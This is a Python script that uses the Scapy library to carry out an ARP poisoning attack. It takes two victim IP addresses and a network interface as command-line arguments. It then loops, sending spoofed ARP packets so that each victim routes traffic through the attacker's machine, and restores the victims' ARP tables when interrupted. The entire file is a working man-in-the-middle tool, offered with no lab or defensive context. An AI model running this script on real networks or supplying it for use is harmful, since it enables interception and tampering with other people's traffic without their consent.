# Packages
from scapy.all import ARP, Ether, conf, get_if_hwaddr, send, sniff, sndrcv, srp, wrpcap, getmacbyip
import sys
import time

# Constants
DIVIDER = '=' * 60
POISON_BREAK = 2

# ARP Poisoning Attack
class ARPPoisoning():
    # Constructs the ARP Poisoning Attack
    def __init__(self, victimOneIP, victimTwoIP, interface):
        # Assign targets
        self.victimOneIP = victimOneIP
        self.victimTwoIP = victimTwoIP
        self.interface = interface

        # Assign default scapy interface
        conf.iface = interface

        # Assign macAddresses
        self.victimOneMac = getmacbyip(victimOneIP)
        self.victimTwoMac = getmacbyip(victimTwoIP)
        self.deviceMac = get_if_hwaddr(interface)

    # Returns interactive prompt string
    def __repr__(self):
        return 'ARPPoisoning({}, {}, {})'.format(self.victimOneIP, self.victimTwoIP, self.interface)

    # Returns string representation
    def __str__(self):
        return 'ARP Poisoning on {}:\n - Victim One IP {} at {}\n - Victim Two IP {} at {}'.format(
                self.interface, self.victimOneIP, self.victimOneMac, self.victimTwoIP, self.victimTwoMac)

    # Print Initialization Message
    def printInitializationMessage(self):
        print('{divider}\nRunning {str}\n{divider}'.format(divider = DIVIDER, str = self))
        print('Press [CTRL-C] to stop the ARP Poisoning and clean the ARP tables of the victims')

    # Execute the attack
    def execute(self):
        # Print initialization message
        self.printInitializationMessage()

        # Setup packets
        # ARP Poisoning packet for victim one
        victimOnePoisonPacket = ARP(hwsrc = self.deviceMac,
                           psrc = self.victimTwoIP,
                           pdst = self.victimOneIP, 
                           hwdst = self.victimOneMac)

        # ARP Poisoning packet for victim two
        victimTwoPoisonPacket = ARP(hwsrc = self.deviceMac,
                            psrc = self.victimOneIP,
                            pdst = self.victimTwoIP,
                            hwdst = self.victimTwoMac)

        # Infinitely poisons the victim and the spoofed device
        while True:
            try: # Send poison packets
                send(victimOnePoisonPacket)
                send(victimTwoPoisonPacket)
                time.sleep(POISON_BREAK)
            except KeyboardInterrupt: # CTRL-C was pressed
                self.clean() # Cleaning ARP tables of the victims
                break

    # Clean ARP tables of the victims
    def clean(self):
        send(ARP(
            op=2,
            psrc=self.victimTwoIP,
            hwsrc=self.victimTwoMac,
            pdst=self.victimOneIP,
            hwdst=self.victimOneMac), count=5)
        send(ARP(
            op=2,
            psrc=self.victimOneIP,
            hwsrc=self.victimOneMac,
            pdst=self.victimTwoIP,
            hwdst=self.victimTwoMac), count=5)

# Starts the program
if __name__ == '__main__':
    # Disables verbosity (command line) mode
    conf.verb = 0

    # Assign parameters to variables
    victimOneIP = sys.argv[1]
    victimTwoIP = sys.argv[2]
    interface = sys.argv[3]

    # Initialize Attack
    attack = ARPPoisoning(victimOneIP, victimTwoIP, interface)

    # Execute attack
    attack.execute()
